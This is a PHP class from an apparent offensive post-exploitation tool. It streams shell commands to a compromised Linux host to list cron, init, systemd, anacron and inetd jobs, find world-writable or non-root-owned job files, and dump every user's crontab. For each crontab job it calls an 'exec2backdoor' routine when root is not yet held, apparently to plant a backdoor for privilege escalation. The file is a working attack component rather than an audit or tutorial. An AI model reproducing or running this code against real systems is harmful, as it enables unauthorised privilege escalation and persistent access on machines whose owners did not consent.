<?php
class check4linux8jobs extends check4linux8suid{
    
    
    public function __construct($eth,$domain,$ip,$port,$protocol,$stream,$templateB64_id,$templateB64_cmd,$templateB64_shell,$id8b64) {
        parent::__construct($eth,$domain,$ip,$port,$protocol,$stream,$templateB64_id,$templateB64_cmd,$templateB64_shell,$id8b64);
    }

    public function jobs(){
        $result = "";
        $this->titre(__FUNCTION__);
        $minute = array();$hour = array();$day = array();$month = array();$day8week = array();
        $user = array();$exec_file = array();
        
        // https://www.hackingarticles.in/linux-privilege-escalation-by-exploiting-cron-jobs/

        
        $data = "ls -lart /etc/rc.d/";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $data = "cat ~/.bashrc  | grep -v '^#' | sort -u 2>/dev/null";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $this->note("init.d files NOT belonging to root!");
        $data = "find /etc/rc.d/init.d \! -uid 0 -type f 2>/dev/null |xargs -r ls -la 2>/dev/null";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $this->note("anything 'useful' in inetd.conf");
        $data = "awk '{print $7}' /etc/inetd.conf 2>/dev/null |xargs -r ls -la 2>/dev/null";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        
        $this->note("systemd files not belonging to root");
        $data = "find /lib/systemd/ \! -uid 0 -type f 2>/dev/null |xargs -r ls -la 2>/dev/null";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        
        $this->note("upstart scripts not belonging to root");
        $data = "find /etc/init \! -uid 0 -type f 2>/dev/null |xargs -r ls -la 2>/dev/null";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        
        $this->note("rc.d files NOT belonging to root!");
        $data = "find /usr/local/etc/rc.d \! -uid 0 -type f 2>/dev/null |xargs -r ls -la 2>/dev/null";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        
        $data = "ps aux | grep -i schedule";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $this->note("contab contents");
        $data = "cat -v /etc/crontab | grep -v -e '^$' | grep -v '^#' 2>/dev/null";
        $contab_contents = $this->lan2stream4result($data,$this->stream_timeout);

        
        $result_tmp = array();
        $this->note("contab jobs infos");
        
        list($minute,$hour,$day,$month,$day8week,$user,$exec_file) = $this->parse4crontab($contab_contents);
        $this->pause();

        $size = count($exec_file);
        for($i=0;$i<$size;$i++){
            $job_filepath = $exec_file[$i];
            $data = "ls -la $job_filepath 2>/dev/null";
            $this->lan2stream4result($data,$this->stream_timeout);
            if (!$this->ip2root8db($this->ip2id)) $this->exec2backdoor($exec_file[$i]);
        }
        $this->pause();

        
        $this->note("are there any cron jobs configured");
        $data = "ls -la /etc/cron* 2>/dev/null";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        
        $this->note("can we manipulate these jobs in any way
World-writable cron jobs and file contents:");
        $data = "find /etc/cron* -perm -0002 -type f -exec ls -la {} -exec cat -v {} 2>/dev/null \;";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        
        
        
        $this->note("Anything interesting in /var/spool/cron/crontabs:");
        $data = "ls -la /var/spool/cron/crontabs 2>/dev/null";
        $this->lan2stream4result($data,$this->stream_timeout);

        
        $this->note("Anacron jobs and associated file permissions:");
        $data = "ls -la /etc/anacrontab 2>/dev/null; grep -v -e '^$' /etc/anacrontab 2>/dev/null";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $this->note("When were jobs last executed (/var/spool/anacron contents):");
        $data = "ls -la /var/spool/anacron 2>/dev/null";
        $this->lan2stream4result($data,$this->stream_timeout);

        
        $this->note("pull out account names from /etc/passwd and see if any users have associated cronjobs (priv command)");
        $data = "cut -d ':' -f 1 /etc/passwd | xargs -n1 crontab -l -u 2>/dev/null";
        $this->lan2stream4result($data,$this->stream_timeout);

        
        
        $data = "cat \$(ls /var/spool/cron/crontabs/*) 2> /dev/null  ";
        $lines = $this->lan2stream4result($data,$this->stream_timeout);
        
        $data = "cat \$(ls /var/spool/cron/*) 2> /dev/null";
        $lines = $this->lan2stream4result($data,$this->stream_timeout);
        
        $data = "cat  /etc/inetd.conf | grep -v '^#' | sort -u 2>/dev/null";
        $lines = $this->lan2stream4result($data,$this->stream_timeout);
        
        $data = "/bin/ls -alR /etc/cron.d/";
        $lines = $this->lan2stream4result($data,$this->stream_timeout);
        
        $data = "crontab -l | grep -v '^#' | sort -u 2>/dev/null";
        $lines = $this->lan2stream4result($data,$this->stream_timeout);
        
        $data = "ls -al /etc/cron*";
        $lines = $this->lan2stream4result($data,$this->stream_timeout);
        
        $data = "grep -v -e '^$' /etc/at.*  | grep -v '^#' | sort -u 2>/dev/null";
        $lines = $this->lan2stream4result($data,$this->stream_timeout);
        
        $data = "cat /var/spool/cron/crontabs/root  | grep -v '^#' | sort -u 2>/dev/null";
        $lines = $this->lan2stream4result($data,$this->stream_timeout);
        
        $data = "ls -al /etc/ | grep cron";
        $lines = $this->lan2stream4result($data,$this->stream_timeout);
        
        $data = "ls -alh /var/spool/cron";
        $lines = $this->lan2stream4result($data,$this->stream_timeout);
        
        
        
        $data = "crontab -l | grep -v \"^#\"  ";
        $process_lists = $this->lan2stream4result($data,$this->stream_timeout);
        $lines = explode("\n", $process_lists);
        foreach ($lines as $line){
            if(!empty($line)){
                $this->article("Jobs", $line);
            }
            
        }
        
        return $result ;
    }

      
    
}
?>